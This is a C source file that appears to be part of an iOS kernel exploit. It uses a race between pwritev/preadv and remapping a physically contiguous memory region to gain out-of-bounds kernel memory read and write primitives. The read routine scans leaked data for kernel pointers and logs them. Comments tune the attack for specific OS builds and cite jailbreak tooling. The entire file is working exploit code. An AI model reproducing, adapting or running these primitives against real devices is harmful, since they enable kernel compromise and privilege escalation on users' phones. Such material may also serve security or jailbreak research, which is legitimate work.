#include "phys_oob.h"

#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

#include "surface.h"
#include <errno.h>

// creates physically contiguous mapping in Purplegfxmem and sets marker to it
void cs2_init_phys_rw(mach_vm_size_t contiguous_mapping_size) {
    cs2_ctx.pc_size = contiguous_mapping_size;
    kern_return_t kr = cs2_create_pc_mapping(&cs2_ctx.pc_object, &cs2_ctx.pc_address, cs2_ctx.pc_size);
    if (kr != KERN_SUCCESS) {
        LOG_ERR("cs2_create_pc_mapping: %s (%d)", mach_error_string(kr), kr);
        return;
    }

    // pc -> physically contiguous
    LOG("pc_object: %#x", cs2_ctx.pc_object);
    LOG("pc_address: %#llx", cs2_ctx.pc_address);

    // set random marker
    memset_pattern8((void*)cs2_ctx.pc_address, &cs2_ctx.random_marker, cs2_ctx.pc_size);

    // "free target" will be the addr of the pc mapping
    cs2_ctx.free_target = cs2_ctx.pc_address;
    cs2_ctx.free_target_size = cs2_ctx.pc_size;

    atomic_store_explicit(&cs2_ctx.shared->free_target_sync, cs2_ctx.free_target, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->free_target_size_sync, cs2_ctx.free_target_size, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->go_sync, 1, memory_order_seq_cst);
}

static uint64_t first_try_logs = 0;

kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    // target_object_sync here on first pass is set to memory_object from mem entry
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    // offset we're at in the search mapping
    atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    // set iov base to physically contiguous addr + 0x3f00
    cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
    /* Two capture lanes (24A435 recovered TAP 2026-11-04):
         OG / A13 18.x: iov_len = 0x1000, HIT only when pwritev EFAULT (w==-1)
           then pread. That is Dopamine ClearSword verbatim.
         27.0 / T8150: pwritev returns the full length (w=4096 on verbatim,
           w=16384 on calib). LightSword ID-sweep: ok=30720 fail=0, PARTIAL
           and WRONG live on the SUCCESS copy. Inspect the file whenever
           copy_confusion_lane is set. iov_len = vm_page_size matches calib.
       hop-1 cluster_*_contig stays closed (EINVAL since 26.1). */
    size_t iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
        ? (size_t)vm_page_size
        : (size_t)(offset + size);
    cs2_ctx.iov.iov_len = iov_len;

    memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
    memcpy((void*)(cs2_ctx.pc_address + 0x3f00 + offset), &cs2_ctx.random_marker, sizeof(uint64_t));

    bool read_race_succeeded = false;
    ssize_t w = 0;

    /* volume law: 100 tries × 8 mappings × 0x2000 pages = VM machine-gun
       (configd watchdog 2026-11-04 19:36 EST, P007OpenOnly 1.24GiB / 13M faults).
       copy27: 8 tries until first HIT, then 16. OG EFAULT: adaptive 100+. */
    uint64_t max_tries = cs2_ctx.copy_confusion_lane
        ? (cs2_ctx.highiest_success_idx ? 16ull : 8ull)
        : (cs2_ctx.highiest_success_idx + 100ull);
    for (uint64_t try_idx = 0; try_idx < max_tries; try_idx++) {
        if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // trigger bug to read oob_offset oob
        w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
        int saved_errno = errno;
        if (try_idx == 0 && first_try_logs++ < 6)
            LOG("oob try0: w=%zd errno=%d (win-cap=%llu) lane=%s iov=%zx",
                w, (w == -1) ? saved_errno : 0,
                (unsigned long long)cs2_ctx.highiest_success_idx,
                cs2_ctx.copy_confusion_lane ? "copy27" : "efault",
                iov_len);
        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);
        mach_vm_address_t map_addr = cs2_ctx.pc_address;
        // put physicallly contiguous mapping back
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, cs2_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("cs2_oob_read: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return KERN_FAILURE;
        }

        if (w == -1 || (cs2_ctx.copy_confusion_lane && w > 0)) {
            /* Pre-fill so a short pread cannot look like a PARTIAL HIT
               (calloc zeros / leftover from the previous page). */
            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
            ssize_t nread = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
            if (nread < 8) {
                usleep(1);
                continue;
            }
            uint64_t q0 = 0, q1 = 0;
            memcpy(&q0, buffer, sizeof(q0));
            if (nread >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
            uint64_t unmarked = 0, kptr_n = 0, spray_n = 0, first_foreign = 0;
            uint64_t zerofill_n = 0;
            static uint64_t kptr_seen[8] = {0};
            static int kptr_seen_n = 0;
            uint64_t unmarked_q[12] = {0}; int unmarked_q_n = 0;
            size_t nq = (size_t)nread / 8;
            for (size_t qi = 0; qi < nq; qi++) {
                uint64_t q = 0;
                memcpy(&q, buffer + qi * 8, sizeof(q));
                if (q == cs2_ctx.random_marker) continue;
                if (q == 0) { zerofill_n++; continue; }  /* v2: the 0x7000 zero-hole page is NOT kernel content */
                unmarked++;
                if (!first_foreign) first_foreign = q;
                /* v2: the 24A435 band (0xfffffe00-class kvas) joins the 23F77 band */
                if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
                    q >= 0xfffffe0000000000ull) {
                    kptr_n++;
                    if (kptr_seen_n < 8) kptr_seen[kptr_seen_n++] = q;
                }
                if (unmarked_q_n < 12) unmarked_q[unmarked_q_n++] = q;
                if ((q >> 32) == 0xc0dec0deull) spray_n++;
            }
            /* OG: wholesale page replace, q0 != marker.
               copy27: calib PARTIAL is mixed (q0 still marker, later qwords
               foreign). Hunt those windows too. hop-1 stays closed. */
            bool wholesale = (unmarked > 0 && q0 != cs2_ctx.random_marker);
            bool partial = (cs2_ctx.copy_confusion_lane && unmarked > 0 && q0 == cs2_ctx.random_marker);
            if (unmarked == 0 && zerofill_n > 0) {
                static uint64_t hole_logs = 0;
                if (cs2_ctx.copy_confusion_lane && hole_logs++ < 6)
                    LOG("[oob] HOLEWINDOW lane=copy27 zerofill=%llu w=%zd (the 0x7000 hole -- HUNT follows)",
                        (unsigned long long)zerofill_n, w);
            }
            if (wholesale || partial) {
                read_race_succeeded = true;
                cs2_ctx.success_read_count += 1;
                if (try_idx > cs2_ctx.highiest_success_idx) {
                    cs2_ctx.highiest_success_idx = try_idx;
                }
                {
                    static uint64_t hit_logs = 0;
                    if (hit_logs++ < 8) {
                        const char *cls = "other";
                        if (kptr_n) cls = "KERNEL POINTER";
                        else if (spray_n) cls = "spray-page tag";
                        LOG("oob HIT lane=%s kind=%s cls=%s w=%zd try=%llu q0=%#llx foreign=%#llx unmarked=%llu kptr=%llu spray=%llu",
                            w == -1 ? "efault" : "copy27",
                            partial ? "PARTIAL" : "WHOLESALE",
                            cls, w, (unsigned long long)try_idx, q0, first_foreign,
                            (unsigned long long)unmarked,
                            (unsigned long long)kptr_n,
                            (unsigned long long)spray_n);
                    }
                }
                    /* v2: the unmarked dump + the kptr rows */
                    for (int ui = 0; ui < unmarked_q_n; ui++)
                        LOG("[oob] HIT unmarked[%d]=%#llx", ui, (unsigned long long)unmarked_q[ui]);
                    for (int ki = 0; ki < kptr_seen_n; ki++)
                        LOG("[oob] HIT kptr[%d]=%#llx", ki, (unsigned long long)kptr_seen[ki]);
                    /* v2: the bidirectional HUNT around this anchor (hole
                       geometry and real-content windows) — +/-6 pages,
                       stop at the first real-content page. */
                    {
                        static const off_t steps2[11] = { 0x1000, -0x1000, 0x2000, -0x2000, 0x3000, -0x3000, 0x4000, -0x4000, 0x5000, -0x5000, 0x6000 };
                        for (int si2 = 0; si2 < 11; si2++) {
                            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
                            ssize_t wn = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset + steps2[si2]);
                            if (wn < 8) continue;
                            uint64_t wu = 0, wk = 0, wz = 0, wf = 0;
                            static uint64_t wk_seen[4] = {0};
                            int wk_n = 0;
                            size_t wnq = (size_t)wn / 8;
                            for (size_t wqi = 0; wqi < wnq; wqi++) {
                                uint64_t wq = 0;
                                memcpy(&wq, buffer + wqi * 8, sizeof(wq));
                                if (wq == cs2_ctx.random_marker) continue;
                                if (wq == 0) { wz++; continue; }
                                wu++;
                                if (!wf) wf = wq;
                                if ((wq >> 36) == 0xfffffff0ull || (wq >> 32) == 0xfffffe00ull ||
                                    wq >= 0xfffffe0000000000ull) {
                                    wk++;
                                    if (wk_n < 4) wk_seen[wk_n++] = wq;
                                }
                            }
                            if (wu)
                                LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx",
                                    (unsigned long long)(0x3f00 + offset + steps2[si2]),
                                    (unsigned long long)wu, (unsigned long long)wz,
                                    (unsigned long long)wk, wk ? "  <-- POINTERS" : "  <-- CONTENT",
                                    (unsigned long long)wf);
                            for (int ki = 0; ki < wk_n && ki < 4; ki++)
                                LOG("[oob] HUNT kptr=0x%016llx", (unsigned long long)wk_seen[ki]);
                            if (wu > 0) break;
                        }
                    }
                    break;
            }
            {
                static uint64_t miss_logs = 0;
                miss_logs++;
                if (cs2_ctx.copy_confusion_lane && (miss_logs <= 4 || (miss_logs % 2048) == 0))
                    LOG("oob MISS lane=copy27 q0=%#llx q1=%#llx (full marker, UPL neighbor silent)",
                        q0, q1);
            }
            usleep(1);
        }

        if (try_idx == 500) {
            // LOG_DEBUG("we failed");
            break;
        }
    }
    // LOG_DEBUG("read race result success is: %s", read_race_succeeded ? "true" : "false");
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
    return read_race_succeeded ? KERN_SUCCESS : KERN_FAILURE;
}

// retry until success
void cs2_oob_read_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
    while (true) {
        kern_return_t kr = cs2_oob_read(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr == KERN_SUCCESS) {
            break;
        }
    }
}

void cs2_oob_write(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
    cs2_ctx.iov.iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
        ? (size_t)vm_page_size
        : (size_t)(offset + size);
    // read from buffer into fd
    pwrite(cs2_ctx.write_fd, buffer, size, 0x3f00 + offset);

    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // write from the fd into (oob) memory
        preadv(cs2_ctx.write_fd, &cs2_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);

        mach_vm_address_t map_addr = cs2_ctx.pc_address;
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, cs2_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("cs2_oob_write: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return;
        }
    }

    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
}
